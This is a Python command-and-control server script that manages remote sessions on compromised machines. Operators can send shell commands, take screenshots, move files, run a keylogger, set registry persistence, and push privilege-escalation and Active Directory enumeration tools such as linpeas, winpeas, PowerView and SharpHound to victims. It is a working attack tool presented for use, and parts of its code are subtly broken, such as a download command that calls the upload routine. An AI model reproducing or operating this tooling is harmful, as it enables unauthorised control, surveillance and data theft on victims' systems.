## This is a Command & control server that is used to manage the different sessions and extra.
## USAGE: python3 C2_Center.py <IP> <PORT>

import socket
import json
import os
import threading
import sys

RED, REGULAR, GREEN, YELLOW, BLUE = '\33[31m', '\33[37m', '\33[32m', '\33[33m', '\33[34m'


def reliable_recv(target):
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def reliable_send(target, data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())


def upload_file(target, file_name):
    f = open(file_name, 'rb')
    target.send(f.read())


def download_file(target, file_name):
    f = open(file_name, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()


def target_communication(target, ip):
    count = 0
    while True:
        command = input(f'{YELLOW}* {GREEN}%s {BLUE}=>{REGULAR} ' % str(ip))
        reliable_send(target, command)
        if command == 'quit':
            break
        elif command == 'background':
            break
        elif command == 'clear':
            os.system('clear')
        elif command[:3] == 'cd ':
            pass
        elif command[:6] == 'upload':
            upload_file(target, command[7:])
        elif command[:8] == 'download':
            upload_file(target, command[9:])
        elif command == 'linpeas':
            upload_file(target, 'linpeas.sh')
        elif command == 'winpeas':
            upload_file(target, 'winpeas.exe')
        elif command == 'seatbelt':
            upload_file(target, 'seatbelt.exe')
        elif command == 'Pview':
            upload_file(target, 'PowerView.ps1')
        elif command == 'bloodhound':
            upload_file(target, 'sharphound.ps1')
        elif command[:10] == 'screenshot':
            f = open('screenshot%d.png' % (count), 'wb')
            target.settimeout(3)
            chunk = target.recv(1024)
            while chunk:
                f.write(chunk)
                try:
                    chunk = target.recv(1024)
                except socket.timeout as e:
                    break
            target.settimeout(None)
            f.close()
            count += 1
        elif command == '?':
            print(f'''{RED}\n
        GENERAL:{YELLOW}
            quit                                --> Quit Session With The Target
            background                          --> Background The Current Session
            clear                               --> Clear The Screen
            cd *Directory Name*                 --> Changes Directory On Target System
            upload *file name*                  --> Upload File To The target Machine
            screenshot             				--> Takes a Screenshot Of The Target Machine
            download *file name*                --> Download File From Target Machine
            keylog_start                        --> Start The Keylogger
            keylog_dump                         --> Print Keystrokes That The Target Inputted
            keylog_stop                         --> Stop And Self Destruct Keylogger File
            persistence *RegName* *fileName*    --> Create Persistence In Registry\n{RED}
        
        PRIVESC SCRIPTS:{YELLOW}
            linpeas                             --> (LINUX) Uploads linpeas.sh To The Target
            winpeas                             --> (WINDOWS) Upload winpeas.exe To The Target
            seatbelt                            --> Uploads seatbelt.exe to the target.{RED}
        
        DOMAIN ENUM:{YELLOW}
            Pview                               --> Uploads PowerView.ps1 To The Target
            bloodhound                          --> Uploads sharphound.ps1 To The Target{REGULAR}''')
        else:
            result = reliable_recv(target)
            print(result)


def accept_connections():
    while True:
        if stop_flag:
            break
        sock.settimeout(1)
        try:
            target, ip = sock.accept()
            targets.append(target)
            ips.append(ip)
            print(f'\n{GREEN}{str(ip)} has connected!{REGULAR}')
        except:
            pass


IP = str(sys.argv[1])
port = int(sys.argv[2])
targets = []
ips = []
stop_flag = False
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((IP, port))
sock.listen(20) ## change this to handle more connections
t1 = threading.Thread(target=accept_connections)
t1.start()
print(f'{GREEN}[+] Waiting For The Incoming Connections ...\n(type "?" for help){REGULAR}')

while True:
    command = input(f'{YELLOW}[*]{RED} C2_Center: {REGULAR}')
    if command == '?':
        print(f'''{YELLOW}\n
        exit 				--> Exit The Program
        targets				--> See The Current Connected Sessions
        session *session ID*		--> Interact With a Connected Session
        sendall				--> Send a Command To All Connected Sessions
        kill *session ID*		--> Close A Connected Session
        \n{REGULAR}''')

    elif command == 'targets':
        counter = 0
        for ip in ips:
            print(f'{BLUE}Session {str(counter)}{REGULAR}{YELLOW}--- {str(ip)}{REGULAR}')
            counter += 1
    elif command == 'clear':
        os.system('clear')
    elif command[:7] == 'session':
        try:
            num = int(command[8:])
            session_num = targets[num]
            target_ip = ips[num]
            target_communication(session_num, target_ip)
        except:
            print(f'{RED}[-] No Session Under That ID{REGULAR}')
    elif command == 'exit':
        for target in targets:
            reliable_send(target, 'quit')
            target.close()
        sock.close()
        stop_flag = True
        t1.join()
        break
    elif command[:4] == 'kill':
        targ = targets[int(command[5:])]
        ip = ips[int(command[5:])]
        reliable_send(targ, 'quit')
        targ.close()
        targets.remove(targ)
        ips.remove(ip)
    elif command[:7] == 'sendall':
        x = len(targets)
        print(x)
        i = 0
        try:
            while i < x:
                session_number = targets[i]
                print(session_number)
                reliable_send(session_number, command)
                i += 1
        except:
            print(f'{RED}[-] Failed{REGULAR}')
    elif command == '':
        pass
    else:
        print(f'{RED}[!!] No Such Command{REGULAR}')
